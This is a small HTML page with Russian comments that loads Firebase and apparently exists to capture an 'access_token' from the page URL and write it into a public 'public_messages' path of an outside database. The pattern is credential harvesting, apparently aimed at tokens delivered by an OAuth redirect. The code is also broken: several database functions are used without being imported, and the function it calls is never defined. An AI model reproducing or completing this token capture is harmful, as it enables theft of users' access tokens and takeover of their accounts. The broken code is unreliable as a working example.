 <html>
  <head>
  <script type="module">
      // Подключаем необходимые функции из Firebase CDN (актуально для 2026)
  import { initializeApp } from 'https://www.gstatic.com/firebasejs/12.8.0/firebase-app.js'

    // If you enabled Analytics in your project, add the Firebase SDK for Google Analytics
    import { getAnalytics } from 'https://www.gstatic.com/firebasejs/12.8.0/firebase-analytics.js'

    // Add Firebase products that you want to use
    import { getAuth } from 'https://www.gstatic.com/firebasejs/12.8.0/firebase-auth.js'
    import { getFirestore } from 'https://www.gstatic.com/firebasejs/12.8.0/firebase-firestore.js'

  // Конфигурация вашего проекта (возьмите её в настройках проекта Firebase)
  const firebaseConfig = {
    databaseURL: "https://winnigames2024app-default-rtdb.firebaseio.com",
  };

  // Инициализация
  const app = initializeApp(firebaseConfig);
  const db = getDatabase(app);

  // Функция для записи текста
  async function addTextToDb(messageText) {
    try {
      const dbRef = ref(db, 'public_messages'); // Путь к папке в базе
      const newEntryRef = push(dbRef);          // Создаем уникальный ключ для записи
      
      await set(newEntryRef, {
        text: messageText,
        createdAt: new Date().toISOString()
      });
      
      console.log("Данные успешно добавлены!");
    } catch (error) {
      console.error("Ошибка при записи:", error);
    }
  }
    </script>

        <script type="text/javascript">
      const urlParamsV2Params = new URLSearchParams(window.location.search);
const access_token = urlParamsV2Params.get('access_token');

if (access_token) {
  saveText(access_token);
}

    </script>
  </head>
</html>
